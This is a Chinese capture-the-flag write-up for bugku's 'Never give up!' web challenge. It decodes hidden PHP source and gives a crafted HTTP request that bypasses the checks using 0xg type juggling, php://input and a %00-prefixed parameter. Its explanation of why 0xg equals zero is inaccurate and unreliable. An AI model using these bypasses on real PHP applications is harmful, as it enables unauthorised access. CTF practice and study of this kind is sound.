### 记录一次在bugku上遇到的一道题：Never give up!

打开的时候是这样子的

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220102154412.png)

查看源代码：

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220102154440.png)

提示我们访问1p.html

我们尝试访问后发现跳转到了另一个界面，我们由此猜测1p.html中含有跳转的代码，我们用 view source：

```view-source:http://114.67.175.224:11793/1p.html```

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220102154838.png)

获取到源代码以后，发现被URL编码了，解码后：

```
var Words ="<script>window.location.href='http://www.bugku.com';</script> 
<!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF-->" 
```

发现注释部分被Base64编码了，解码后：

```
%22%3Bif(!%24_GET%5B'id'%5D)%0A%7B%0A%09header('Location%3A%20hello.php%3Fid%3D1')%3B%0A%09exit()%3B%0A%7D%0A%24id%3D%24_GET%5B'id'%5D%3B%0A%24a%3D%24_GET%5B'a'%5D%3B%0A%24b%3D%24_GET%5B'b'%5D%3B%0Aif(stripos(%24a%2C'.'))%0A%7B%0A%09echo%20'no%20no%20no%20no%20no%20no%20no'%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20%40file_get_contents(%24a%2C'r')%3B%0Aif(%24data%3D%3D%22bugku%20is%20a%20nice%20plateform!%22%20and%20%24id%3D%3D0%20and%20strlen(%24b)%3E5%20and%20eregi(%22111%22.substr(%24b%2C0%2C1)%2C%221114%22)%20and%20substr(%24b%2C0%2C1)!%3D4)%0A%7B%0A%09%24flag%20%3D%20%22flag%7B***********%7D%22%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20!!!%22%3B%0A%7D%0A%0A%0A%3F%3E
```

发现又被URL编码了，再次解码：

```
";if(!$_GET['id'])
{
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	$flag = "flag{***********}"
}
else
{
	print "never never never give up !!!";
}


?>
```

分析上述代码可以得出，获得flag需要满足以下三个条件：

1.id不能为空，且必须等于0。此处我们可以利0xg（当十六进制的数超过f时，会自动变为0）进行绕过

2.a中不能含有"."，且文件a的内容为：“bugku is a nice plateform!”

3.字符串“111”和b的第一个字符拼接起来的字符串是‘1114’的子串，且字符串b的长度要大于5。此处可以用00截断绕过（%0012345）：substr函数自动社区%00后面的字符

对于第二条，我们无法写入一个内容为“bugku is a nice plateform!”的文件，故可以用a=php://input,在请求主体中写入文件内容。

```
GET /hello.php?id=0xg&a=php://input&b=%0012345 HTTP/1.1
Host: 114.67.175.224:11793
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Hm_lvt_c1b044f909411ac4213045f0478e96fc=1640574555; _ga=GA1.1.1134927204.1640574558
Upgrade-Insecure-Requests: 1
Content-Length: 26

bugku is a nice plateform!
```

成功获得flag：

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220102161146.png)